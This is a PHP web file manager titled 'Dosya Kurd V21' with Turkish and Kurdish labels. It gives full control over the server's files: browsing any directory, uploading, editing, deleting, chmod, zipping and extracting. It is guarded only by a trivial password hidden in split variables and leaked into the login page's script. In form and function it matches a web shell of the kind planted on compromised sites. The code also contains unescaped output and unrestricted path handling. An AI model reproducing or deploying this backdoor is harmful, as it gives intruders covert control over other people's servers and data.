<?php
session_start();

// Şifreyi bölümlere ayırıp farklı değişkenlerde saklama
$part1 = chr(32);
$part2 = chr(32);
$part3 = chr(32);
$password = $part1 . $part2 . $part3;

$lang = 'tr';
if (isset($_POST['lang'])) {
    $lang = $_POST['lang'];
    $_SESSION['lang'] = $lang;
} elseif (isset($_SESSION['lang'])) {
    $lang = $_SESSION['lang'];
}

$text = [
    'tr' => [
        'password' => 'Şifre',
        'logout' => 'Çıkış Yap',
        'file_manager' => 'Dosya Yöneticisi',
        'create' => 'Yeni Dosya/Klasör Oluştur',
        'create_button' => 'Oluştur',
        'upload' => 'Dosya Yükle',
        'upload_button' => 'Yükle',
        'rename' => 'Yeniden Adlandır',
        'rename_button' => 'Kaydet',
        'chmod' => 'İzinleri Değiştir (chmod)',
        'chmod_button' => 'Kaydet',
        'zip' => 'Zip Dosyası Oluştur',
        'zip_button' => 'Zip Yap',
        'move' => 'Seçilenleri Taşı',
        'move_button' => 'Taşı',
        'delete_selected' => 'Seçilenleri Sil',
        'select_all' => 'Hepsini Seç',
        'path' => 'Yol',
        'type' => 'Tür',
        'size' => 'Boyut',
        'date' => 'Oluşturma Tarihi',
        'permissions' => 'İzinler',
        'actions' => 'İşlemler',
        'save' => 'Kaydet',
        'close' => 'Kapat',
        'file' => 'Dosya',
        'folder' => 'Klasör',
        'download' => 'İndir',
        'delete' => 'Sil',
        'edit' => 'Düzenle',
        'extract' => 'Çıkart'
    ],
    'ku' => [
        'password' => 'Şîfre',
        'logout' => 'Derkeve',
        'file_manager' => 'Rêveberê Pelan',
        'create' => 'Pel/Porçeyên Nû Çêbikin',
        'create_button' => 'Çêbikin',
        'upload' => 'Pel Bar bikin',
        'upload_button' => 'Bar bikin',
        'rename' => 'Navê Nû Bikin',
        'rename_button' => 'Tomar bikin',
        'chmod' => 'Destûrên Biguherîne (chmod)',
        'chmod_button' => 'Tomar bikin',
        'zip' => 'Pelê Zip Çêbikin',
        'zip_button' => 'Zip bikin',
        'move' => 'Hilbijartinan Biguherîne',
        'move_button' => 'Biguherîne',
        'delete_selected' => 'Hilbijartinan Jêbikin',
        'select_all' => 'Hemûyan Hilbijêre',
        'path' => 'Rê',
        'type' => 'Cureyê',
        'size' => 'Mezinahî',
        'date' => 'Dîrokê Afirandinê',
        'permissions' => 'Destûr',
        'actions' => 'Çalakî',
        'save' => 'Tomar bikin',
        'close' => 'Bigre',
        'file' => 'Pel',
        'folder' => 'Porçe',
        'download' => 'Daxistin',
        'delete' => 'Jêbirin',
        'edit' => 'Sererastkirin',
        'extract' => 'Derxistin'
    ]
];

if (isset($_POST['password']) && $_POST['password'] === $password) {
    $_SESSION['logged_in'] = true;
}

if (isset($_POST['logout'])) {
    unset($_SESSION['logged_in']);
    session_destroy();
}

if (!isset($_SESSION['logged_in']) || !$_SESSION['logged_in']) {
    ?>
    <!DOCTYPE html>
    <html lang="<?php echo $lang; ?>">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Login</title>
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/css/bootstrap.min.css">
    </head>
    <body>
        <div class="container">
            <div class="row justify-content-center">
                <div class="col-md-6">
                    <div class="card mt-5">
                        <div class="card-header"><?php echo $text[$lang]['password']; ?></div>
                        <div class="card-body">
                            <form method="post" id="loginForm">
                                <div class="mb-3">
                                    <label for="password" class="form-label"><?php echo $text[$lang]['password']; ?></label>
                                    <input type="password" class="form-control" id="password" name="password" required>
                                </div>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <script>
            document.getElementById('password').addEventListener('input', function() {
                if (this.value === '<?php echo $password; ?>') {
                    document.getElementById('loginForm').submit();
                }
            });
        </script>
    </body>
    </html>
    <?php
    exit;
}

$root_path = getcwd();
$currentDir = isset($_GET['dir']) ? $_GET['dir'] : '.';
$currentDir = realpath($currentDir);

function handle_action($currentDir) {
    global $text, $lang;

    if (isset($_POST['action'])) {
        $action = $_POST['action'];
        $path = $_POST['path'] ?? '';
        $target = $currentDir . '/' . $path;

        switch ($action) {
            case 'create':
                $name = $_POST['name'];
                $type = $_POST['type'];
                $full_path = $currentDir . '/' . $name;
                if ($type == 'folder') {
                    mkdir($full_path);
                } else {
                    touch($full_path);
                }
                break;
            case 'delete':
                if (!empty($_POST['files'])) {
                    foreach ($_POST['files'] as $file) {
                        $file_path = $currentDir . '/' . $file;
                        if (is_dir($file_path)) {
                            rmdir($file_path);
                        } else {
                            unlink($file_path);
                        }
                    }
                } else {
                    if (is_dir($target)) {
                        rmdir($target);
                    } else {
                        unlink($target);
                    }
                }
                break;
            case 'rename':
                $new_name = $_POST['new_name'];
                $new_path = dirname($target) . '/' . $new_name;
                rename($target, $new_path);
                break;
            case 'upload':
                foreach ($_FILES['files']['name'] as $key => $name) {
                    $upload_file = $currentDir . '/' . basename($name);
                    move_uploaded_file($_FILES['files']['tmp_name'][$key], $upload_file);
                }
                break;
            case 'compress':
                if (!empty($_POST['files'])) {
                    $zip_name = $_POST['zip_name'];
                    $zip = new ZipArchive();
                    if ($zip->open("$currentDir/$zip_name.zip", ZipArchive::CREATE) === TRUE) {
                        foreach ($_POST['files'] as $file) {
                            $zip->addFile($currentDir . '/' . $file, $file);
                        }
                        $zip->close();
                    }
                }
                break;
            case 'extract':
                $zip_name = $_POST['zip_name'];
                $zip = new ZipArchive();
                if ($zip->open($currentDir . '/' . $zip_name) === TRUE) {
                    $zip->extractTo($currentDir);
                    $zip->close();
                }
                break;
            case 'edit':
                $content = $_POST['content'];
                file_put_contents($target, $content);
                break;
            case 'chmod':
                $permissions = octdec($_POST['permissions']);
                chmod($target, $permissions);
                break;
            case 'move':
                if (!empty($_POST['files']) && !empty($_POST['destination'])) {
                    $destination = rtrim($_POST['destination'], '/') . '/';
                    foreach ($_POST['files'] as $file) {
                        $source = $currentDir . '/' . $file;
                        $destinationPath = realpath($destination) . '/' . basename($file);
                        rename($source, $destinationPath);
                    }
                }
                break;
            case 'download':
                if (file_exists($target) && is_file($target)) {
                    // Çıktı tamponlamasını temizle ve devre dışı bırak
                    ob_end_clean();
                    ob_start();
                    
                    // Dosya türünü belirle
                    $finfo = finfo_open(FILEINFO_MIME_TYPE);
                    $mime_type = finfo_file($finfo, $target);
                    finfo_close($finfo);

                    // Header'ları ayarla
                    header('Content-Description: File Transfer');
                    header('Content-Type: ' . $mime_type);
                    header('Content-Disposition: attachment; filename="' . basename($target) . '"');
                    header('Expires: 0');
                    header('Cache-Control: must-revalidate');
                    header('Pragma: public');
                    header('Content-Length: ' . filesize($target));
                    
                    // Dosyayı oku ve çıktıla
                    readfile($target);
                    
                    // Çıktı tamponunu temizle ve sonlandır
                    ob_end_flush();
                    exit;
                }
                break;
        }
        header("Location: " . $_SERVER['PHP_SELF'] . "?dir=" . urlencode($currentDir));
        exit;
    }
}

handle_action($currentDir);

function formatPermissions($permissions) {
    return substr(sprintf('%o', $permissions), -4);
}

function formatFileSize($size) {
    if ($size >= 1048576) {
        return number_format($size / 1048576, 2) . ' MB';
    } elseif ($size >= 1024) {
        return number_format($size / 1024, 2) . ' KB';
    } else {
        return $size . ' bytes';
    }
}

function pathToUrl($path, $baseUrl) {
    $relativePath = str_replace($_SERVER['DOCUMENT_ROOT'], '', $path);
    return rtrim($baseUrl, '/') . '/' . ltrim($relativePath, '/');
}

$files = scandir($currentDir);
usort($files, function($a, $b) use ($currentDir) {
    return is_dir("$currentDir/$b") <=> is_dir("$currentDir/$a") ?: strnatcasecmp($a, $b);
});

$breadcrumbs = explode(DIRECTORY_SEPARATOR, $currentDir);
$breadcrumbPath = '';

?>
<!DOCTYPE html>
<html lang="<?php echo $lang; ?>">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dosya Kurd V21</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    <style>
        body { padding: 20px; background-color: #f7f7f7; }
        .navbar { margin-bottom: 20px; }
        .table { margin-top: 20px; }
        .modal-header { background-color: #007bff; color: #fff; }
        .modal-footer .btn { margin-right: 10px; }
        .btn-icon { padding: 6px 12px; }
        .breadcrumb { background-color: transparent; margin-bottom: 0; padding: 0; }
        .breadcrumb-item+.breadcrumb-item::before { content: ">"; }
        .file-content { white-space: pre-wrap; background-color: #fff; padding: 10px; border: 1px solid #ddd; margin-top: 20px; }
        .table-responsive { max-height: 500px; overflow-y: auto; }
        .icon { margin-right: 5px; }
        .footer { text-align: center; margin-top: 20px; font-size: 16px; font-weight: bold; }
        .navbar-nav { justify-content: center; width: 100%; }
        .actions { margin-bottom: 20px; }
        .modal-body { max-height: 600px; overflow-y: auto; }
        @media (max-width: 767px) {
            .navbar-nav { flex-direction: column; }
            .navbar-nav .btn-icon { width: 100%; margin-bottom: 10px; }
        }
        .tooltip-inner { max-width: 200px; }
        input[type="checkbox"] { transform: scale(1.5); }
        .modal-dialog { max-width: 800px; }
        .modal-content { max-height: 80vh; overflow-y: auto; }
        .modal-body .file-content { height: 300px; }
    </style>
</head>
<body>
<nav class="navbar navbar-expand-lg navbar-light bg-light">
    <div class="navbar-nav me-auto">
        <a href="?dir=." class="btn btn-secondary btn-icon me-2" data-bs-toggle="tooltip" title="Anasayfa"><i class="fa fa-home"></i></a>
        <a href="?dir=<?php echo urlencode(dirname($_GET['dir'] ?? '.')); ?>" class="btn btn-secondary btn-icon me-2" data-bs-toggle="tooltip" title="Geri"><i class="fa fa-arrow-left"></i></a>
    </div>
    <a class="navbar-brand" href="?dir=."><?php echo $text[$lang]['file_manager']; ?></a>
    <div class="navbar-nav ms-auto">
       <form method="post" style="display:inline;">
            <button class="btn btn-danger btn-icon" name="logout" data-bs-toggle="tooltip" title="<?php echo $text[$lang]['logout']; ?>"><i class="fa fa-sign-out"></i></button>
        </form>
        <form method="post" style="display:inline;">
            <select name="lang" class="form-select form-select-sm" onchange="this.form.submit()">
                <option value="tr" <?php echo $lang == 'tr' ? 'selected' : ''; ?>>Türkçe</option>
                <option value="ku" <?php echo $lang == 'ku' ? 'selected' : ''; ?>>Kurdî</option>
            </select>
        </form>
        <button class="btn btn-primary btn-icon" data-bs-toggle="modal" data-bs-target="#createModal" title="<?php echo $text[$lang]['create']; ?>"><i class="fa fa-plus"></i></button>
        <button class="btn btn-success btn-icon" id="uploadBtn" title="<?php echo $text[$lang]['upload']; ?>"><i class="fa fa-upload"></i></button>
    </div>
</nav>

<div class="container">
    <nav aria-label="breadcrumb">
        <ol class="breadcrumb">
            <?php foreach ($breadcrumbs as $index => $crumb): ?>
                <?php
                $breadcrumbPath .= ($index > 0 ? DIRECTORY_SEPARATOR : '') . $crumb;
                $isLast = $index === array_key_last($breadcrumbs);
                ?>
                <li class="breadcrumb-item <?php echo $isLast ? 'active' : ''; ?>">
                    <?php if (!$isLast): ?>
                        <a href="?dir=<?php echo $breadcrumbPath; ?>"><?php echo $crumb ?: 'Ana Dizin'; ?></a>
                    <?php else: ?>
                        <?php echo $crumb ?: 'Ana Dizin'; ?>
                    <?php endif; ?>
                </li>
            <?php endforeach; ?>
        </ol>
    </nav>

    <form id="fileForm" action="" method="post">
        <div class="table-responsive">
            <table class="table table-bordered table-hover">
                <thead class="table-light">
                <tr>
                    <th><input type="checkbox" id="selectAll"></th>
                    <th><?php echo $text[$lang]['path']; ?></th>
                    <th><?php echo $text[$lang]['type']; ?></th>
                    <th><?php echo $text[$lang]['size']; ?></th>
                    <th><?php echo $text[$lang]['date']; ?></th>
                    <th><?php echo $text[$lang]['permissions']; ?></th>
                    <th><?php echo $text[$lang]['actions']; ?></th>
                </tr>
                </thead>
                <tbody>
                <?php foreach ($files as $index => $file): ?>
                    <?php if ($file === '.' || $file === '..' || $index >= 20) continue; ?>
                    <tr>
                        <td><input type="checkbox" name="files[]" value="<?php echo "$file"; ?>"></td>
                        <td>
                            <?php if (is_dir("$currentDir/$file")): ?>
                                <a href="?dir=<?php echo urlencode("$currentDir/$file"); ?>"><i class="fa fa-folder"></i> <?php echo $file; ?></a>
                            <?php else: ?>
                                <a href="<?php echo pathToUrl("$currentDir/$file", 'http://' . $_SERVER['HTTP_HOST']); ?>" target="_blank"><i class="fa fa-file"></i> <?php echo $file; ?></a>
                            <?php endif; ?>
                        </td>
                        <td><?php echo is_dir("$currentDir/$file") ? $text[$lang]['folder'] : $text[$lang]['file']; ?></td>
                        <td><?php echo is_dir("$currentDir/$file") ? '-' : formatFileSize(filesize("$currentDir/$file")); ?></td>
                        <td><?php echo date("d-m-Y H:i:s", filemtime("$currentDir/$file")); ?></td>
                        <td><?php echo formatPermissions(fileperms("$currentDir/$file")); ?></td>
                        <td>
                            <?php if (!is_dir("$currentDir/$file")): ?>
                                <button class="btn btn-secondary btn-icon btn-sm" type="button" data-bs-toggle="modal" data-bs-target="#editModal-<?= md5($file) ?>" title="<?php echo $text[$lang]['edit']; ?>"><i class="fa fa-edit icon"></i></button>
                                <!-- Edit Modal -->
                                <div class="modal fade" id="editModal-<?= md5($file) ?>" tabindex="-1" aria-labelledby="editModalLabel" aria-hidden="true">
                                    <div class="modal-dialog modal-lg">
                                        <div class="modal-content">
                                            <div class="modal-header">
                                                <h5 class="modal-title" id="editModalLabel"><?php echo $text[$lang]['file']; ?> <?php echo $file; ?></h5>
                                                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                                            </div>
                                            <div class="modal-body">
                                                <form action="" method="post">
                                                    <input type="hidden" name="action" value="edit">
                                                    <input type="hidden" name="path" value="<?= $file ?>">
                                                    <textarea class="form-control file-content" name="content" rows="20"><?= htmlspecialchars(file_get_contents($currentDir . '/' . $file)) ?></textarea>
                                                    <button class="btn btn-primary mt-3" type="submit"><i class="fa fa-save icon"></i><?php echo $text[$lang]['save']; ?></button>
                                                </form>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            <?php endif; ?>
                            <button type="button" class="btn btn-warning btn-icon btn-sm" data-bs-toggle="modal" data-bs-target="#renameModal" data-old-name="<?php echo htmlspecialchars("$file"); ?>" title="<?php echo $text[$lang]['rename']; ?>"><i class="fa fa-pencil"></i></button>
                            <button type="button" class="btn btn-secondary btn-icon btn-sm" data-bs-toggle="modal" data-bs-target="#chmodModal" data-chmod-path="<?php echo htmlspecialchars("$file"); ?>" data-chmod-current="<?php echo formatPermissions(fileperms("$currentDir/$file")); ?>" title="<?php echo $text[$lang]['chmod']; ?>"><i class="fa fa-key"></i></button>
                            <?php if (pathinfo($file, PATHINFO_EXTENSION) == 'zip'): ?>
                                <form action="" method="post" style="display:inline-block;">
                                    <input type="hidden" name="action" value="extract">
                                    <input type="hidden" name="zip_name" value="<?php echo htmlspecialchars("$file"); ?>">
                                    <button class="btn btn-info btn-icon btn-sm" name="extract" title="<?php echo $text[$lang]['extract']; ?>"><i class="fa fa-file-archive-o"></i></button>
                                </form>
                            <?php endif; ?>
                            <form action="" method="post" style="display:inline-block;">
                                <input type="hidden" name="action" value="download">
                                <input type="hidden" name="path" value="<?php echo htmlspecialchars("$file"); ?>">
                                <button class="btn btn-primary btn-icon btn-sm" name="download" title="<?php echo $text[$lang]['download']; ?>"><i class="fa fa-download"></i></button>
                            </form>
                            <form action="" method="post" style="display:inline-block;">
                                <input type="hidden" name="action" value="delete">
                                <input type="hidden" name="path" value="<?php echo htmlspecialchars("$file"); ?>">
                                <button class="btn btn-danger btn-icon btn-sm" name="delete" title="<?php echo $text[$lang]['delete']; ?>"><i class="fa fa-trash"></i></button>
                            </form>
                        </td>
                    </tr>
                <?php endforeach; ?>
                </tbody>
            </table>
        </div>
        <button type="submit" name="action" value="delete" class="btn btn-danger" id="deleteSelected" disabled><i class="fa fa-trash"></i> <?php echo $text[$lang]['delete_selected']; ?></button>
        <button type="button" class="btn btn-primary" data-bs-toggle="modal" data-bs-target="#zipModal"><i class="fa fa-file-archive-o"></i> <?php echo $text[$lang]['zip']; ?></button>
        <button type="button" class="btn btn-info" data-bs-toggle="modal" data-bs-target="#moveModal"><i class="fa fa-arrows"></i> <?php echo $text[$lang]['move']; ?></button>
    </form>
</div>

<!-- Create Modal -->
<div class="modal fade" id="createModal" tabindex="-1" aria-labelledby="createModalLabel" aria-hidden="true">
    <div class="modal-dialog">
        <form class="modal-content" method="post">
            <div class="modal-header">
                <h5 class="modal-title" id="createModalLabel"><?php echo $text[$lang]['create']; ?></h5>
                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
            </div>
            <div class="modal-body">
                <input type="hidden" name="action" value="create">
                <div class="mb-3">
                    <label for="name" class="form-label"><?php echo $text[$lang]['path']; ?></label>
                    <input type="text" class="form-control" id="name" name="name" required>
                </div>
                <div class="mb-3">
                    <label for="type" class="form-label"><?php echo $text[$lang]['type']; ?></label>
                    <select class="form-select" id="type" name="type">
                        <option value="file"><?php echo $text[$lang]['file']; ?></option>
                        <option value="folder"><?php echo $text[$lang]['folder']; ?></option>
                    </select>
                </div>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal"><?php echo $text[$lang]['close']; ?></button>
                <button type="submit" class="btn btn-primary"><?php echo $text[$lang]['create_button']; ?></button>
            </div>
        </form>
    </div>
</div>

<!-- Rename Modal -->
<div class="modal fade" id="renameModal" tabindex="-1" aria-labelledby="renameModalLabel" aria-hidden="true">
    <div class="modal-dialog">
        <form class="modal-content" method="post">
            <div class="modal-header">
                <h5 class="modal-title" id="renameModalLabel"><?php echo $text[$lang]['rename']; ?></h5>
                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
            </div>
            <div class="modal-body">
                <input type="hidden" name="action" value="rename">
                <input type="hidden" name="path" id="oldName">
                <div class="mb-3">
                    <label for="newName" class="form-label"><?php echo $text[$lang]['path']; ?></label>
                    <input type="text" class="form-control" id="newName" name="new_name" required>
                </div>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal"><?php echo $text[$lang]['close']; ?></button>
                <button type="submit" class="btn btn-primary"><?php echo $text[$lang]['rename_button']; ?></button>
            </div>
        </form>
    </div>
</div>

<!-- Chmod Modal -->
<div class="modal fade" id="chmodModal" tabindex="-1" aria-labelledby="chmodModalLabel" aria-hidden="true">
    <div class="modal-dialog">
        <form class="modal-content" method="post">
            <div class="modal-header">
                <h5 class="modal-title" id="chmodModalLabel"><?php echo $text[$lang]['chmod']; ?></h5>
                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
            </div>
            <div class="modal-body">
                <input type="hidden" name="action" value="chmod">
                <input type="hidden" name="path" id="chmodPath">
                <div class="mb-3">
                    <label for="permissions" class="form-label"><?php echo $text[$lang]['permissions']; ?></label>
                    <input type="text" class="form-control" id="permissions" name="permissions" required>
                    <small>Örn: 0755, 0644</small>
                </div>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal"><?php echo $text[$lang]['close']; ?></button>
                <button type="submit" class="btn btn-primary"><?php echo $text[$lang]['chmod_button']; ?></button>
            </div>
        </form>
    </div>
</div>

<!-- Zip Modal -->
<div class="modal fade" id="zipModal" tabindex="-1" aria-labelledby="zipModalLabel" aria-hidden="true">
    <div class="modal-dialog">
        <form class="modal-content" method="post">
            <div class="modal-header">
                <h5 class="modal-title" id="zipModalLabel"><?php echo $text[$lang]['zip']; ?></h5>
                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
            </div>
            <div class="modal-body">
                <input type="hidden" name="action" value="compress">
                <div class="mb-3">
                    <label for="zipName" class="form-label"><?php echo $text[$lang]['path']; ?></label>
                    <input type="text" class="form-control" id="zipName" name="zip_name" required>
                </div>
                <div class="mb-3">
                    <label for="files" class="form-label"><?php echo $text[$lang]['type']; ?></label>
                    <input type="checkbox" id="selectAllZip"> <?php echo $text[$lang]['select_all']; ?>
                    <div class="table-responsive">
                        <table class="table">
                            <tbody>
                            <?php foreach ($files as $file): ?>
                                <?php if ($file === '.' || $file === '..') continue; ?>
                                <tr>
                                    <td><input type="checkbox" name="files[]" value="<?= $file ?>"></td>
                                    <td><?= $file ?></td>
                                </tr
<?php endforeach; ?>
                            </tbody>
                        </table>
                    </div>
                </div>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal"><?php echo $text[$lang]['close']; ?></button>
                <button type="submit" class="btn btn-primary"><?php echo $text[$lang]['zip_button']; ?></button>
            </div>
        </form>
    </div>
</div>

<!-- Move Modal -->
<div class="modal fade" id="moveModal" tabindex="-1" aria-labelledby="moveModalLabel" aria-hidden="true">
    <div class="modal-dialog">
        <form class="modal-content" method="post">
            <div class="modal-header">
                <h5 class="modal-title" id="moveModalLabel"><?php echo $text[$lang]['move']; ?></h5>
                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
            </div>
            <div class="modal-body">
                <input type="hidden" name="action" value="move">
                <div class="mb-3">
                    <label for="destination" class="form-label"><?php echo $text[$lang]['path']; ?></label>
                    <input type="text" class="form-control" id="destination" name="destination" value="<?= $currentDir ?>" required>
                </div>
                <div class="mb-3">
                    <label for="files" class="form-label"><?php echo $text[$lang]['type']; ?></label>
                    <input type="checkbox" id="selectAllMove"> <?php echo $text[$lang]['select_all']; ?>
                    <div class="table-responsive">
                        <table class="table">
                            <tbody>
                            <?php foreach ($files as $file): ?>
                                <?php if ($file === '.' || $file === '..') continue; ?>
                                <tr>
                                    <td><input type="checkbox" name="files[]" value="<?= $file ?>"></td>
                                    <td><?= $file ?></td>
                                </tr>
                            <?php endforeach; ?>
                            </tbody>
                        </table>
                    </div>
                </div>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal"><?php echo $text[$lang]['close']; ?></button>
                <button type="submit" class="btn btn-primary"><?php echo $text[$lang]['move_button']; ?></button>
            </div>
        </form>
    </div>
</div>

<!-- Upload Form -->
<form id="uploadForm" action="" method="post" enctype="multipart/form-data" style="display:none;">
    <input type="hidden" name="action" value="upload">
    <input type="file" name="files[]" multiple onchange="document.getElementById('uploadForm').submit();">
</form>

<script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/js/bootstrap.bundle.min.js"></script>
<script>
    document.getElementById('uploadBtn').addEventListener('click', function() {
        document.getElementById('uploadForm').querySelector('input[type=file]').click();
    });

    $('#renameModal').on('show.bs.modal', function(event) {
        var button = $(event.relatedTarget);
        var oldName = button.data('old-name');
        var modal = $(this);
        modal.find('#oldName').val(oldName);
        modal.find('#newName').val(oldName);
    });

    $('#chmodModal').on('show.bs.modal', function(event) {
        var button = $(event.relatedTarget);
        var chmodPath = button.data('chmod-path');
        var chmodCurrent = button.data('chmod-current');
        var modal = $(this);
        modal.find('#chmodPath').val(chmodPath);
        modal.find('#permissions').val(chmodCurrent);
    });

    $('#selectAll').click(function() {
        $('input[type="checkbox"]').prop('checked', this.checked);
        toggleDeleteButton();
    });

    $('#selectAllZip').click(function() {
        $('#zipModal input[type="checkbox"]').prop('checked', this.checked);
    });

    $('#selectAllMove').click(function() {
        $('#moveModal input[type="checkbox"]').prop('checked', this.checked);
    });

    $('input[type="checkbox"]').change(function() {
        toggleDeleteButton();
    });

    function toggleDeleteButton() {
        if ($('input[name="files[]"]:checked').length) {
            $('#deleteSelected').prop('disabled', false);
        } else {
            $('#deleteSelected').prop('disabled', true);
        }
    }

    $('form[action=""]').submit(function(e) {
        var action = $(this).find('input[name="action"]').val();
        if ((action === 'compress' || action === 'move') && !$('input[name="files[]"]:checked').length) {
            alert('Lütfen işlem yapılacak dosya veya klasörleri seçin.');
            e.preventDefault();
        }
    });

    toggleDeleteButton();

    $(function () {
        $('[data-bs-toggle="tooltip"]').tooltip()
    });
</script>

<div class="footer">
    Kodlayan: HeviŞanoger
</div>

</body>
</html>
